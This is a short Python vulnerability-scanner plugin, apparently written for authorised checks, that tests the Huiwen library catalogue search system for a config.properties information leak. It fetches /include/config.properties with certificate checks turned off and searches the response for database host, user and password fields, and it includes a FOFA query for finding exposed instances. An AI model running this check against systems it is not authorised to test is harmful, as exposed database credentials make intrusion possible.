#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {}
  ret['links'] = ["https://peiqi.wgpsec.org/wiki/webapp/汇文/汇文 图书馆书目检索系统 config.properties 信息泄漏漏洞.html"]
  ret['huixian'] = ''
  ret['method'] = 'get'
  ret['bugname'] = "汇文图书馆书目检索系统config.properties信息泄漏漏洞"
  ret['level'] = "high"
  ret['FOFA'] = 'app="汇文软件-书目检索系统"'
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/include/config.properties"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'host=.*?port.*?sid=.*?user=.*?password.*?indexDir.*?',res.text,re.S):
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret